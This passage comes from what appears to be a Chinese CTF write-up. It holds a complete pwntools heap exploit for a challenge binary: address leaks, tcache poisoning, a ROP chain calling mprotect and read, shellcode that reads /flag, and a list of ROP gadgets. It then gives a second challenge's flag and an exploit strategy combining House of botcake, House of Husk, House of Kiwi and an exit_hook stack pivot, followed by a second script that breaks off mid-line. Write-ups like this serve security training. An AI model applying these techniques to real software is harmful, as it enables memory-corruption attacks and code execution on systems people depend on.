<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python2</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: utf-8 -*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="9"></td><td><pre>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>lg <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>data <span class="token punctuation">:</span> p<span class="token punctuation">.</span>success<span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">': \033[1;36m 0x%x \033[0m'</span> <span class="token operator">%</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>breakpoint<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    glibc_dir <span class="token operator">=</span> <span class="token string">'~/Exps/Glibc/glibc-2.27/'</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    gdbscript <span class="token operator">=</span> <span class="token string">'directory %smalloc/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="22"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'directory %sstdio-common/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="23"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'directory %sstdlib/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="24"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'directory %slibio/\n'</span> <span class="token operator">%</span> glibc_dir</pre></td></tr><tr><td data-num="25"></td><td><pre>    elf_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'pmap &#123;&#125;| awk \x27&#123; &#123;print \x241&#125; &#125;\x27'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">if</span> elf<span class="token punctuation">.</span>pie <span class="token keyword">else</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    gdbscript <span class="token operator">+=</span> <span class="token string">'b *&#123;:#x&#125;\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>breakpoint<span class="token punctuation">)</span> <span class="token operator">+</span> elf_base<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>breakpoint<span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token keyword">else</span> breakpoint</pre></td></tr><tr><td data-num="27"></td><td><pre>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>context<span class="token punctuation">(</span>arch <span class="token operator">=</span> elf<span class="token punctuation">.</span>arch<span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-hp'</span><span class="token punctuation">,</span><span class="token string">'62'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token comment"># p = process('./pwn')</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token comment"># debug()</span></pre></td></tr><tr><td data-num="34"></td><td><pre>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'192.168.166.147'</span><span class="token punctuation">,</span><span class="token number">58011</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Idx: \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span>data<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    sla<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    sea<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="60"></td><td><pre>heap_leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>heap_base <span class="token operator">=</span> heap_leak <span class="token operator">&lt;&lt;</span><span class="token number">12</span></pre></td></tr><tr><td data-num="62"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'heap_leak'</span><span class="token punctuation">,</span>heap_leak<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'heap_base'</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    add<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 9</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="71"></td><td><pre>show<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre>libc_leak <span class="token operator">=</span> uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre>libc_base <span class="token operator">=</span> libc_leak <span class="token operator">-</span> <span class="token number">0x1e0c75</span></pre></td></tr><tr><td data-num="74"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'libc_leak'</span><span class="token punctuation">,</span>libc_leak<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="75"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="76"></td><td><pre><span class="token comment">#libc = ELF('./libc.so.6')</span></pre></td></tr><tr><td data-num="77"></td><td><pre>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc</pre></td></tr><tr><td data-num="78"></td><td><pre>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_base</pre></td></tr><tr><td data-num="79"></td><td><pre>system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system</pre></td></tr><tr><td data-num="80"></td><td><pre>bin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\0'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre>stderr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1f3680</span></pre></td></tr><tr><td data-num="84"></td><td><pre>sync <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1e24a0</span> <span class="token operator">+</span> <span class="token number">0x60</span></pre></td></tr><tr><td data-num="85"></td><td><pre>magic <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x529ad</span></pre></td></tr><tr><td data-num="86"></td><td><pre>helper <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1e1940</span></pre></td></tr><tr><td data-num="87"></td><td><pre>ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026699</span></pre></td></tr><tr><td data-num="88"></td><td><pre>rdi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000028a55</span></pre></td></tr><tr><td data-num="89"></td><td><pre>rsi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002a4cf</span></pre></td></tr><tr><td data-num="90"></td><td><pre>rdx <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000c7f32</span></pre></td></tr><tr><td data-num="91"></td><td><pre>addr <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x400</span></pre></td></tr><tr><td data-num="92"></td><td><pre></pre></td></tr><tr><td data-num="93"></td><td><pre>mmp <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span></pre></td></tr><tr><td data-num="94"></td><td><pre>    <span class="token number">0</span><span class="token punctuation">,</span>rdi<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">12</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span><span class="token number">0x2000</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>mprotect<span class="token punctuation">,</span>rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>addr<span class="token operator">+</span><span class="token number">0x400</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>read<span class="token punctuation">,</span>libc_base <span class="token operator">+</span> <span class="token number">0x00000000000506b1</span></pre></td></tr><tr><td data-num="95"></td><td><pre><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre></pre></td></tr><tr><td data-num="97"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>mmp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="98"></td><td><pre><span class="token comment"># edit(1,mmp)</span></pre></td></tr><tr><td data-num="99"></td><td><pre></pre></td></tr><tr><td data-num="100"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_leak<span class="token operator">^</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="101"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 11</span></pre></td></tr><tr><td data-num="102"></td><td><pre><span class="token comment"># pause()</span></pre></td></tr><tr><td data-num="103"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 12</span></pre></td></tr><tr><td data-num="104"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>helper<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="105"></td><td><pre>lg<span class="token punctuation">(</span><span class="token string">'ADDR'</span><span class="token punctuation">,</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="106"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 13</span></pre></td></tr><tr><td data-num="107"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x2a8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="108"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>sync<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="109"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="110"></td><td><pre>edit<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>magic<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="111"></td><td><pre></pre></td></tr><tr><td data-num="112"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="113"></td><td><pre>    edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0xd30</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="114"></td><td><pre>    add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="115"></td><td><pre>    edit<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="116"></td><td><pre></pre></td></tr><tr><td data-num="117"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="118"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="119"></td><td><pre>add<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="120"></td><td><pre></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token comment"># # add()</span></pre></td></tr><tr><td data-num="122"></td><td><pre>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="123"></td><td><pre>sl<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="124"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="125"></td><td><pre></pre></td></tr><tr><td data-num="126"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="127"></td><td><pre>0x0000000000028a55 : pop rdi ; ret</pre></td></tr><tr><td data-num="128"></td><td><pre>0x0000000000112a51 : pop rdx ; pop r12 ; ret</pre></td></tr><tr><td data-num="129"></td><td><pre>0x00000000001574e6 : pop rdx ; pop rbx ; ret</pre></td></tr><tr><td data-num="130"></td><td><pre>0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret</pre></td></tr><tr><td data-num="131"></td><td><pre>0x00000000000c7f32 : pop rdx ; ret</pre></td></tr><tr><td data-num="132"></td><td><pre>0x0000000000095982 : pop rdx ; ret 0x11</pre></td></tr><tr><td data-num="133"></td><td><pre>0x0000000000093342 : pop rdx ; ret 0xfffc</pre></td></tr><tr><td data-num="134"></td><td><pre>0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret</pre></td></tr><tr><td data-num="135"></td><td><pre>0x0000000000028a53 : pop rsi ; pop r15 ; ret</pre></td></tr><tr><td data-num="136"></td><td><pre>0x000000000002a4cf : pop rsi ; ret</pre></td></tr><tr><td data-num="137"></td><td><pre>0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</pre></td></tr><tr><td data-num="138"></td><td><pre>0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</pre></td></tr><tr><td data-num="139"></td><td><pre>0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret</pre></td></tr><tr><td data-num="140"></td><td><pre>0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret</pre></td></tr><tr><td data-num="141"></td><td><pre>0x000000000002a04c : pop rsp ; pop r13 ; ret</pre></td></tr><tr><td data-num="142"></td><td><pre>0x00000000000de0e6 : pop rsp ; pop rbp ; ret</pre></td></tr><tr><td data-num="143"></td><td><pre>0x0000000000033af2 : pop rsp ; ret</pre></td></tr><tr><td data-num="144"></td><td><pre>0x0000000000026699 : ret</pre></td></tr><tr><td data-num="145"></td><td><pre>'''</span></pre></td></tr></table></figure><h3 id="blue"><a class="anchor" href="#blue">#</a> blue</h3>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444986/Typera/2023/04/8e1ce7b9cbee53accfec12b7b98f925a.png" alt="image-20220619194659319" /></p>
<p><strong>flag{8c65b8bd2169f2cf662ae9e324aaef66}</strong></p>
<p>Ubuntu GLIBC 2.31-0ubuntu9.8 的堆题，IO jumps 段不可写，没有办法按传统思路走。</p>
<p><strong>思路</strong></p>
<ol>
<li>利用后门函数，类似 House of botcake 的手法完成堆块重叠的同时 leak 出 libc。</li>
<li>设置好 House of Husk 的处理函数为 exit</li>
<li>设置好 exit_hook 的俩个函数分别为 gets 和  <code>svcudp_reply+26</code> 。</li>
<li>用 House of Kiwi 触发 exit 调用 exit_hook 完成栈迁移执行 shellcode 读取 flag。</li>
</ol>
<p><strong>Exp</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python2</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: utf-8 -*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> os</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="9"></td><td><pre>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>lg <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>data <span class="token 